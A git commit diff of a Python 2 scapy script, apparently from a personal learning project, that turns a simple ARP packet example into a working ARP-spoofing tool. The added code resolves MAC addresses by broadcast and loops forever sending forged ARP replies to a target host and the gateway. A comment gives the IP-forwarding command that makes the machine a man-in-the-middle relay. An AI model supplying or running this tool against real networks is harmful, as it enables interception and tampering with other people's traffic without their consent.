020386e17e3f220f21faadca11418d54d664e8b0
H S Umer Farooq <h.s.umer.farooq@gmail.com>
2018-09-10 15:16:41 +0500

    final before kali

--- builing_blocks/arp_spoofer2.py
+++ builing_blocks/arp_spoofer2.py
@@ -1,13 +1,32 @@
+#python 2
+# To make your pc a router you need to give the command on termianl
+#echo 1 > /proc/sys/net/ipv4/ip_forward
 import scapy.all as scapy
-# this is how packet made of
-packet = scapy.ARP(op=2, pdst="192.168.0.117",hwdst="60:a4:d0:b9:70:74",psrc="192.168.0.1")
-#if we dont specify hwsrc,it will be detected automatically and if we dont specify "op" then it will take 1 value
-#op = 1 is request and op=2 is for response
+import time
 
-#it will send the packet to target device with new mac address of this device
 
-#packet all information
-print(packet.show())
-#who sent ip+mac
-print(packet.summary())
-scapy.send(packet)
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+# this line will return 2 lists, answered and unanswered.Timeout will specify time to request
+    answered_list = scapy.srp(arp_request_broadcast,timeout=4,verbose=False)[0]#verbose=False for no output on console
+    return answered_list[0][1].hwsrc
+    # print(answered_list[0][1].hwsrc)
+
+
+def spoof(target_ip,spoof_ip):
+    target_mac = get_mac(target_ip)
+
+    #op=1 for sending op=2 for receiveing
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet)
+
+send_packets_count = 0
+while True:
+    spoof("192.168.0.103","192.168.0.1")
+    spoof("192.168.0.1","192.168.0.103")
+    # \r means always start from the start of the line
+    print("\r[+] Packets sent "+str(send_packets_count)),
+
+    time.sleep(2)
